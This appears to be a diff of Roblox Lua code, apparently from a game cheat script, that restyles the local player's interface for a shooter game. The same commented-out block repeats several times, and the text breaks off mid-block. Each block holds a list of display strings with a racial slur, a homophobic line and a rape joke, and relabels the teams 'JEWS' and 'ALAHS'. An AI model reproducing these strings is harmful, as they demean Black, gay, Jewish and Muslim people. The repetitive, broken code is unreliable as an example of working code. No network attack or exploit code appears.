+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
